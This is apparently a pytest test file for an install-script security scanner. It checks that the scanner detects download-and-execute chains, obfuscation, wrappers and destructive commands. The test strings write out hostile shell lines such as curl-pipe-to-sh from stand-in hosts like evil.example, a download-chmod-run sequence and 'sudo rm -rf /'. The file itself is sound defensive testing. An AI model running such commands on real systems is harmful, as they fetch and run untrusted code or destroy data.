"""v13.0.0: artifact lifecycle, control flow, wrappers, fuzz and e2e.

These tests pin the release's central guarantee: *downloaded*, *made
executable*, *interpreted*, *sourced* and *executed* are five distinct
facts, each reported once, at the acting command, with the exact causal
command recorded in evidence.
"""
import json
import random
import string

import pytest

from cex_installguard.analyzer import Analyzer
from cex_installguard.cli import main
from cex_installguard.scanner import scan_text

DL = 'curl -o /tmp/x http://evil.example/a\n'


def ids(text):
    return {f.rule_id for f in scan_text(text)}


def findings_for(text, rule):
    return [f for f in scan_text(text) if f.rule_id == rule]


# --------------------------------------------------------------------------- #
# 1. Lifecycle: five distinct transitions                                     #
# --------------------------------------------------------------------------- #

def test_execute_is_ig048_not_ig049():
    got = ids(DL + 'chmod +x /tmp/x\n/tmp/x\n')
    assert 'IG048' in got and 'IG049' in got


def test_chmod_only_is_preparation_not_execution():
    # the crucial separation: granting +x is NOT running the file
    got = ids(DL + 'chmod +x /tmp/x\n')
    assert 'IG049' in got
    assert 'IG048' not in got


def test_interpreted_is_ig050():
    for interpreter in ('bash', 'sh', 'zsh', 'python3', 'perl', 'ruby'):
        assert 'IG050' in ids(DL + f'{interpreter} /tmp/x\n'), interpreter


def test_sourced_is_ig051():
    assert 'IG051' in ids(DL + 'source /tmp/x\n')
    assert 'IG051' in ids(DL + '. /tmp/x\n')


def test_lifecycle_finding_points_at_acting_command():
    fs = findings_for(DL + 'chmod +x /tmp/x\n/tmp/x\n', 'IG048')
    assert len(fs) == 1
    f = fs[0]
    assert f.line == 3                       # the execution line, not the chmod
    ev = f.evidence
    assert ev['artifact'] == '/tmp/x'
    assert ev['action'] == 'executed'
    assert ev['causal_command'] == 'curl -o /tmp/x http://evil.example/a'
    assert ev['causal_line'] == 1
    assert [s['step'] for s in ev['chain']] == \
        ['download', 'made executable', 'executed']


def test_lifecycle_reported_once_per_artifact():
    text = DL + 'bash /tmp/x\nbash /tmp/x\nbash /tmp/x\n'
    assert len(findings_for(text, 'IG050')) == 1


def test_install_mode_grants_exec_then_execute():
    text = ('curl -o /tmp/y http://e/a\n'
            'install -m 755 /tmp/y /tmp/z\n'
            '/tmp/z\n')
    assert 'IG048' in ids(text)


def test_local_chmod_and_run_is_not_a_lifecycle_finding():
    got = ids('chmod +x ./build.sh\n./build.sh\n')
    assert 'IG048' not in got and 'IG049' not in got


def test_decode_origin_tracked():
    text = 'echo aGVsbG8= | base64 -d > /tmp/p\nbash /tmp/p\n'
    assert 'IG050' in ids(text)


# --------------------------------------------------------------------------- #
# 2. Control flow: bodies are analyzed, keywords are not commands             #
# --------------------------------------------------------------------------- #

@pytest.mark.parametrize('script', [
    'if true; then curl http://x.invalid/a | sh; fi\n',
    'while read l; do curl http://x.invalid/a | sh; done\n',
    'for f in a b; do curl http://x.invalid/a | bash; done\n',
    'until false; do curl http://x.invalid/a | sh; done\n',
    'case $x in\n1) curl http://x.invalid/a | sh;;\nesac\n',
    'if [ -n "$x" ]; then\n  if true; then curl http://x.invalid/a | sh; fi\nfi\n',
])
def test_control_flow_bodies_detected(script):
    assert 'IG001' in ids(script)


def test_control_flow_keyword_as_argument_is_benign():
    assert ids('echo if\necho then do done fi esac\n') == set()


# --------------------------------------------------------------------------- #
# 3. Command wrappers                                                         #
# --------------------------------------------------------------------------- #

@pytest.mark.parametrize('cmd', [
    'sudo curl http://x.invalid/a | sudo bash',
    'doas curl http://x.invalid/a | sh',
    'timeout 30 curl http://x.invalid/a | sh',
    'sudo -u bob curl http://x.invalid/a | sh',
    'nice -n 10 curl http://x.invalid/a | sh',
    'env FOO=1 curl http://x.invalid/a | bash',
    'curl http://x.invalid/a | xargs bash',
    'command curl http://x.invalid/a | sh',
])
def test_wrapper_unwrapping(cmd):
    assert 'IG001' in ids(cmd + '\n')


def test_wrapper_preserves_its_own_finding():
    got = ids('sudo rm -rf /\n')
    assert 'IG006' in got and 'IG002' in got      # privilege AND delete


def test_wrapper_benign():
    assert 'IG001' not in ids('timeout 5 ./deploy.sh\n')
    assert 'IG001' not in ids('nice -n 5 make -j4\n')


# --------------------------------------------------------------------------- #
# 4. Variable propagation                                                     #
# --------------------------------------------------------------------------- #

def test_indirect_command_name():
    assert 'IG001' in ids('C=curl\n$C http://x.invalid/a | bash\n')


def test_variable_chain_resolution():
    assert 'IG001' in ids('A=curl\nB=$A\n$B http://x.invalid/a | sh\n')


# --------------------------------------------------------------------------- #
# 5. Obfuscation + robustness                                                 #
# --------------------------------------------------------------------------- #

def test_ifs_deobfuscation():
    assert 'IG001' in ids('curl${IFS}http://x.invalid/a${IFS}|${IFS}sh\n')


def test_deep_nesting_degrades_without_crashing():
    deep = 'eval ' + '"eval ' * 300 + 'curl http://x.invalid/a | sh' + '"' * 300
    got = ids(deep)                      # must not raise RecursionError
    assert 'IG052' in got


def test_eval_static_body_recursed():
    assert 'IG001' in ids('eval "cu""rl http://x.invalid/a | sh"\n')


# --------------------------------------------------------------------------- #
# 6. Dedup + determinism                                                      #
# --------------------------------------------------------------------------- #

def test_no_duplicate_findings():
    text = 'curl http://x.invalid/a | sh\n' * 5
    keys = [(f.rule_id, f.line, ' '.join(f.code.split())) for f in scan_text(text)]
    assert len(keys) == len(set(keys))


def test_deterministic_output():
    text = open('examples/dangerous.sh').read()
    runs = [scan_text(text) for _ in range(3)]
    sig = lambda fs: [(f.rule_id, f.line, f.code) for f in fs]
    assert sig(runs[0]) == sig(runs[1]) == sig(runs[2])


# --------------------------------------------------------------------------- #
# 7. Fuzz: malformed input must never raise                                   #
# --------------------------------------------------------------------------- #

_FUZZ_ALPHABET = list('abcxyz$"\'`|&;<>(){}[]\\ \n\t#=~/.-*') + ['curl', 'sh',
                                                              'rm', '-rf',
                                                              'http://e', '||']


def test_fuzz_malformed_never_raises():
    rng = random.Random(1337)
    for _ in range(400):
        s = ''.join(rng.choice(_FUZZ_ALPHABET)
                    for _ in range(rng.randint(0, 120)))
        scan_text(s)          # any exception fails the test


def test_fuzz_binary_and_unicode():
    for s in ('\x00\x01\x02', 'ünïcödé …', '\r\n\r\n', '#!/bin/sh\r\nrm -rf /\r\n'):
        scan_text(s)


def test_fuzz_analyzer_direct():
    rng = random.Random(7)
    for _ in range(200):
        s = ''.join(rng.choice(string.printable)
                    for _ in range(rng.randint(0, 80)))
        Analyzer('<fuzz>').analyze(s)


# --------------------------------------------------------------------------- #
# 8. End-to-end CLI                                                           #
# --------------------------------------------------------------------------- #

def _write(tmp_path, name, body):
    p = tmp_path / name
    p.write_text(body)
    return p


def test_e2e_exit_codes(tmp_path, capsys):
    bad = _write(tmp_path, 'bad.sh', 'curl http://x.invalid/a | bash\n')
    good = _write(tmp_path, 'good.sh', 'echo hi\n')
    assert main(['--no-color', '--quiet', str(bad)]) == 2
    assert main(['--no-color', '--quiet', str(good)]) == 0


def test_e2e_reports_written(tmp_path, capsys):
    bad = _write(tmp_path, 'bad.sh', DL + '/tmp/x\n')
    j, s, h = (tmp_path / x for x in ('r.json', 'r.sarif', 'r.html'))
    main(['--no-color', '--quiet', '--json', str(j), '--sarif', str(s),
          '--html', str(h), str(bad)])
    doc = json.loads(j.read_text())
    assert doc['verdict'] == 'BLOCK'
    assert any(f['rule_id'] == 'IG048' for f in doc['findings'])
    sarif = json.loads(s.read_text())
    loc = sarif['runs'][0]['results'][0]['locations'][0]['physicalLocation']
    assert loc['artifactLocation']['uriBaseId'] == '%SRCROOT%'
    assert 'IG048' in h.read_text() or 'Downloaded' in h.read_text()


def test_e2e_baseline_roundtrip(tmp_path, capsys):
    bad = _write(tmp_path, 'bad.sh', 'curl http://x.invalid/a | bash\n')
    base = tmp_path / 'base.json'
    assert main(['--no-color', '--quiet', '--save-baseline', str(base),
                 str(bad)]) == 2
    # after baselining, the same finding is suppressed → clean exit
    assert main(['--no-color', '--quiet', '--baseline', str(base),
                 str(bad)]) == 0


def test_e2e_exclude(tmp_path, capsys):
    vend = tmp_path / 'vendor'
    vend.mkdir()
    _write(vend, 'd.sh', 'curl http://x.invalid/a | bash\n')
    _write(tmp_path, 'ok.sh', 'echo hi\n')
    assert main(['--no-color', '--quiet', '--exclude', 'vendor',
                 str(tmp_path)]) == 0
